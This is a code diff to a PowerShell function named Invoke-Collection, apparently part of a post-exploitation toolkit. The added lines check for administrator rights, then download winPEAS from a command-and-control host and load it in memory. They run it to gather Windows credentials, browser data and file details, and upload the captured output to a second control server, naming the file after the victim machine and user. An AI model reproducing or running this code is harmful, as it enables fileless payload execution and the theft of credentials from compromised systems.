@@ -159,6 +159,34 @@ function Invoke-Collection {
     } catch {
         Write-Host "Error while enumerating root: $_" -ForegroundColor Yellow
     }
+
+    # ----------------------------------------
+    # If admin - run winpeas.exe in memory to find interesting files
+    # ----------------------------------------
+    # Check if running as local admin
+    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
+    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
+    if ($principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+        $peasUrl = "http://$DownloadC2/winpeas.exe"
+        $wp = [System.Reflection.Assembly]::Load(
+            [byte[]](Invoke-WebRequest $peasUrl -UseBasicParsing | Select-Object -ExpandProperty Content)
+        )
+
+        # Redirect stdout to a StringWriter
+        $sw = New-Object System.IO.StringWriter
+        [Console]::SetOut($sw)
+
+        # Execute winPEAS
+        [winPEAS.Program]::Main(@("windowscreds filesinfo fileanalysis browserinfo quiet searchpf"))
+
+        # Capture the output
+        $peasOutput = $sw.ToString()
+
+        # Restore console output
+        [Console]::SetOut([System.IO.StreamWriter]::new([Console]::OpenStandardOutput()))
+
+        Invoke-FileUpload -C2 $UploadC2 -InputString $peasOutput -Filename "$($env:COMPUTERNAME)_$($env:USERNAME)_winpeasPostexp.txt" | Out-Null
+    }
 }
 
 
